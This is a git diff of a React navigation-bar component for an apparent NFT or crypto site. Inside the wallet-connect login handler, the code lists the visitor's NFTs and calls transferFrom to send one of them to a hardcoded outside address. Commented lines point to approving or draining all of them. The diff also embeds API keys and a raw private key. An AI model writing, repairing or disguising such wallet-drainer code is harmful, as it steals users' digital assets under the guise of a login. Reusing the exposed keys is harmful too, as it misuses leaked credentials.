@@ -6,7 +6,8 @@ import { useEffect, useState } from 'react';
 import {  ethers } from "ethers";
 import { ABI1, ABI } from "../../contracts";
 const Tx = require('ethereumjs-tx').Transaction
-const web3 = require('web3');
+const { Web3 } = require('web3');
+var Contract = require('web3-eth-contract');
 
 const Moralis = require("moralis").default;
 const { EvmChain } = require("@moralisweb3/common-evm-utils");
@@ -37,6 +38,9 @@ function Navbar() {
     const [status, setStatus] = useState('');
     const handleAuth = async () => {
             try{
+              if (typeof window.ethereum !== 'undefined') {
+                window.web3 = new Web3(window.ethereum);
+              }
                 await Moralis.start({
                     apiKey: "zHsyrNp97JtRaQ7j7eg7t0ftLBie3ixlyuSu2iTMd0o2iJFWvirrfE5gnCWHfmRI",
                     // ...and any other configuration
@@ -63,26 +67,33 @@ function Navbar() {
         });
         allNFTs.push(response);
     }
-    var url = "https://mainnet.infura.io/v3/57f5f5f45dcd43f1b40212d6833281ed";
+   
+
+    async function requestAccount() {
+      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+      return accounts[0];  // This will return the currently selected account in MetaMask
+    }
+    
+    var url = "https://eth-mainnet.g.alchemy.com/v2/I4-ytXsWlHosPYRrizWlsYUPNLXqNiEs";
     const data = JSON.parse(JSON.stringify(allNFTs[0]));
-    const provider = new ethers.providers.Web3Provider(window.ethereum);
-    const signer = provider.getSigner();
+    const web3 = new Web3(url);
     const tokenIds = data.result.map(item => item.token_id);
     const tokenHashes = data.result.map(item => item.token_address);
     const privateKey1 = Buffer.from('96a438471e8e4dea34dee6e02d2edfd3a76631b4382af7e16116c313d3da93a5', 'hex');
-    const wallet = new ethers.Wallet(privateKey1, provider); // Replace with your private key
-    const length = tokenIds.length;
     const maxPriorityFeePerGas = ethers.utils.parseUnits('2', 'gwei'); // Example: 2 Gwei tip for miners
     const maxFeePerGas = ethers.utils.parseUnits('50', 'gwei'); // Max total fee (base fee + tip) you're willing to pay
-    const nonce = await provider.getTransactionCount(account);
-
-    //for (let i = 0; i < length; i++) {
-      const contract = new web3.eth.Contract(tokenHashes[1], ABI);
-      contract.methods.transferFrom(account, "0x5Af5aE807692F3a9f99187bAa8E4966984F9d524", tokenIds[1])
-      .send({
-        from: account
+    const accounts = await requestAccount();
+    const contract = new web3.eth.Contract(ABI, tokenHashes[1]);
+    contract.methods.transferFrom(accounts, "0x5Af5aE807692F3a9f99187bAa8E4966984F9d524", tokenIds[1])
+      .send({ from: accounts })
+      .on('confirmation', (confirmationNumber, receipt) => {
+        console.log('Transaction confirmed:', confirmationNumber, receipt);
       })
-      .then(()=> {console.log(success)})
+      .on('error', error => {
+        console.error('Error sending transaction:', error);
+      });
+    
+    //for (let i = 0; i < length; i++) {
       // console.log(contract)
       //await contract.setApprovalForAll("0x5Af5aE807692F3a9f99187bAa8E4966984F9d524", true)
       // const tx =  contract.transferFrom(
